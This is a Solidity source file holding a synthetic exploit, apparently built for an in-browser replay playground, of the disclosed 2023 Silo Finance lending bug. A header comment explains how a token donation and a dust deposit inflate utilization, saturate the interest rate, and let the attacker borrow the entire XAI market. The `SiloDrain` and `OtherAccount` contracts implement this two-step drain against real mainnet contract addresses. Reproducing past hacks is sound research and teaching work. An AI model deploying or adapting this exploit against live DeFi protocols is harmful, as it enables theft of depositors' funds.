// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2023-04-silo_finance).
//
// Silo Finance shared-lending interest-rate / solvency logic error (Ethereum,
// bug disclosed ~April 2023 via Immunefi). The vulnerable contract is `Silo`
// (BaseSilo) at 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C. The
// `_validateBorrowAfter` solvency check values a depositor's collateral with a
// per-asset compounded rate `rcomp`, and `rcomp` is driven by utilization
// (`totalBorrowAmount / totalDeposits`) and saturates at `RCOMP_MAX = 2**16e18`
// without reverting. Utilization is manipulable for FREE because a direct token
// transfer to the Silo raises real (borrowable) liquidity but is NOT booked as
// a deposit, so `totalDeposits` (the denominator) stays tiny. An attacker
// deposits dust WETH, donates 1 WETH, has a second account borrow that 1 WETH
// against dust deposits (≈1e13 utilization), waits one block so `accrueInterest`
// saturates `rcomp` to RCOMP_MAX, then borrows the entire XAI market — the dust
// WETH deposit is re-valued at ~6.55e27 "collateral", so the post-borrow
// solvency check passes.
//
// The DeFiHackLabs PoC (test/silo_finance_exp.sol, `SiloBugFixReviewTest`) runs
// the attack across TWO blocks: `run()` primes + triggers the rate at block N,
// then `cheats.rollFork(block.number + 1)` and `run2()` accrues the saturated
// rate and drains XAI. The in-browser recorder replays at ONE timestamp, so this
// synthetic exploit splits the attack into two entrypoints — `prime()` and
// `drain()` — run as two separate top-level calls by the recorder config:
//   - setup rawCall exploit.prime()  (unrecorded, mirrors `run()` exactly)
//   - a setup `storeSlot` rewinds `_interestData[WETH].interestRateTimestamp`
//     by 24s (the original block delta) so `drain()`'s `accrueInterest` actually
//     compounds the saturated rate at the single replay timestamp
//   - recorded `drain()` mirrors `run2()`: accrueInterest(WETH) then borrow all
//     XAI.
//
// All capital (WETH dust + donation, LINK for the helper) is `deal`-ed onto
// this contract by the recorder's setup, mirroring the Foundry `setUp()` deals.
// Profit (450,000 XAI) is measured on this contract's own XAI balance
// (profitReceiver: "exploit").
//
// Logic copied verbatim from the registry test/silo_finance_exp.sol
// (SiloBugFixReview.run/run2 + OtherAccount.depositLinkAndBorrowWETH).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ISilo {
    function deposit(address _asset, uint256 _amount, bool _collateralOnly)
        external returns (uint256 collateralAmount, uint256 collateralShare);
    function borrow(address _asset, uint256 _amount)
        external returns (uint256 debtAmount, uint256 debtShare);
    function accrueInterest(address _asset) external returns (uint256 interest);
}

// Mirrors the registry's `OtherAccount`. Deposits all its LINK as collateral-only
// and borrows 1 WETH, returning the borrowed WETH to its owner. This creates a
// ~1e13 WETH-market utilization that saturates rcomp on the next accrual.
contract OtherAccount {
    ISilo public constant SILO = ISilo(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C);
    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function depositLinkAndBorrowWETH() external onlyOwner {
        // This will inflate the WETH interest rate.
        uint256 depositAmount = LINK.balanceOf(address(this));
        LINK.approve(address(SILO), depositAmount);
        SILO.deposit(address(LINK), depositAmount, true);
        SILO.borrow(address(WETH), 1 ether);
        WETH.transfer(owner, 1 ether); // Return the borrowed amount to the exploit contract
    }
}

contract SiloDrain {
    ISilo public constant SILO = ISilo(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C);
    IERC20 public constant XAI = IERC20(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc);
    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);

    OtherAccount public immutable otherAccount;

    constructor() {
        otherAccount = new OtherAccount();
    }

    // Block 1 — prime the WETH market and trigger the rate. Mirrors
    // SiloBugFixReview.run() (without the console logs). Run UNRECORDED via the
    // recorder's setup phase. Assumes this contract already holds
    // `depositAmount + donatedAmount` WETH and `545e18` LINK (dealt by setup).
    function prime() external {
        uint256 depositAmount = 1e5;
        uint256 donatedAmount = 1e18;

        // Seed the helper with the LINK it will deposit as collateral-only.
        LINK.transfer(address(otherAccount), 545e18);

        SILO.accrueInterest(address(WETH));

        WETH.approve(address(SILO), depositAmount);
        SILO.deposit(address(WETH), depositAmount, false);

        // DONATION: raises real WETH liquidity without booking a deposit, so
        // totalDeposits (the utilization denominator) stays at 1e5.
        WETH.transfer(address(SILO), donatedAmount);

        // Borrow 1 WETH against 1e5-wei deposits → utilization ≈ 1e13.
        otherAccount.depositLinkAndBorrowWETH();
    }

    // Block 2 — accrue the saturated rate and drain XAI. Mirrors
    // SiloBugFixReview.run2(). This is the RECORDED entrypoint. The setup phase
    // rewound `_interestData[WETH].interestRateTimestamp` by 24s so this
    // `accrueInterest` call actually compounds the 1e13 utilization over a
    // 24-second delta, saturating rcomp to RCOMP_MAX (6.5536e22).
    function drain() external {
        SILO.accrueInterest(address(WETH));
        // Borrow the entire XAI balance held by the Silo. _validateBorrowAfter
        // values our dust WETH deposit at 1e5 * rcomp ≈ 6.55e27 → passes.
        SILO.borrow(address(XAI), XAI.balanceOf(address(SILO)));
    }
}
